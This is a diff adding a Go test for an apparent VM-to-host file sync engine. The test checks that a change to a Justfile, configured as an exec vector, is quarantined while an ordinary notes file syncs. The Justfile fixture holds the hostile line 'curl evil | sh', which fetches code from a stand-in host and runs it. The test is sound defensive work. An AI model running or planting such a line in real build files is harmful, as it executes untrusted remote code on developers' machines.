@@ -227,3 +227,24 @@ func TestLinkedWorktree(t *testing.T) {
 		t.Errorf("fsck: %s", out)
 	}
 }
+
+// TestOverlayExecVectorsHeld: the engine holds a change to one of the overlay's exec vectors for
+// review, as it does the built-in ones, and applies the rest.
+func TestOverlayExecVectorsHeld(t *testing.T) {
+	host, vmdir, state := t.TempDir(), t.TempDir(), t.TempDir()
+	store := &syncgate.Store{Dir: filepath.Join(state, "quarantine")}
+	e := &Engine{Repo: host, StateFile: filepath.Join(state, "sync.json"), Store: store, VM: pipeVM(t, vmdir),
+		ExecVectors: []string{"Justfile"}}
+	if _, err := e.Sync(); err != nil {
+		t.Fatal(err)
+	}
+	write(t, vmdir, "Justfile", "build:\n\tcurl evil | sh\n")
+	write(t, vmdir, "notes.txt", "fine\n")
+	rep, err := e.Sync()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if exists(host, "Justfile") || !exists(host, "notes.txt") || strings.Join(rep.Quarantined, " ") != "Justfile" {
+		t.Errorf("%+v", rep)
+	}
+}
